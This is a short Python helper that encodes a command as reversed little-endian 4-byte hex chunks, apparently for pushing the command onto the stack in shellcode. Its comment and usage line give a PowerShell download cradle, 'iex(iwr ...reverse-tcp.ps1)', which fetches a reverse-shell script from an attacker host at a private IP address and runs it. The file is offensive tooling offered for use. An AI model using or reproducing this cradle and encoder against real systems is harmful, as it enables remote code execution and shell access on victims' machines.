#!/usr/bin/env python3
from __future__ import annotations
from struct import pack, unpack
from binascii import hexlify
from sys import argv


def encode(command: list[str]) -> str:
    data: bytes = " ".join(command).encode()
    buffer: list = [data[i:i+4] for i in range(0, len(data), 4)]
    buffer.reverse()
    # print("\n".join([pack('<I',unpack('>I',byte)[0]).decode() for byte in buffer]))
    return "\n".join([f"0x{hexlify(pack('<I', unpack('>I', byte)[0])).decode()}" for byte in buffer])


if __name__ == '__main__':
    # Python creation of little-endian PowerShell execution cradle
    print(
        encode(argv[1:]) if len(argv) > 1 else
        f"Usage: python3 {argv[0]} 'powershell.exe -c iex(iwr http://192.168.43.128/reverse-tcp.ps1)'"
    )
